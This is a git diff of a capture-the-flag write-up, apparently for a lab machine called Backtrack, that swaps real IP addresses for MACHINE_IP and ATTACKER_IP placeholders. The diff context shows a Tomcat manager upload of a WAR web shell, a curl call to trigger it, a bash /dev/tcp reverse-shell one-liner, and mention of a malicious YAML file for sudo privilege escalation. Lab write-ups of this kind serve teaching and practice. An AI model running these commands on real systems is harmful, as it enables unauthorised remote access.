@@ -152,7 +152,7 @@ curl -u tomcat:[PASSWORD] --upload-file shell.war 'http://MACHINE_IP:8080/manage
 Lastly, I setup a Netcat listener and cURL the location of our shell on the site (the trailing / is important for the shell to proc).
 
 ```
-curl http://10.64.169.192:8080/shell/
+curl http://MACHINE_IP:8080/shell/
 ```
 
 ![](../assets/img/2026-02-06-Backtrack/6.png)
@@ -169,7 +169,7 @@ The presence of that wildcard operator will be our key to getting a shell as Wil
 As of now we aren't allowed to create new files in the `/test_playbooks` directory so we'll need to host our files somewhere both Tomcat and Wilbur can like `/tmp`. My shell is a simple bash `/dev/tcp/` payload:
 
 ```
-bin/bash -i >& /dev/tcp/192.168.144.73/4567 0>&1
+bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
 ```
 
 We also need to host a malicious .yml file that will redirect the Sudo binary to execute our shell:
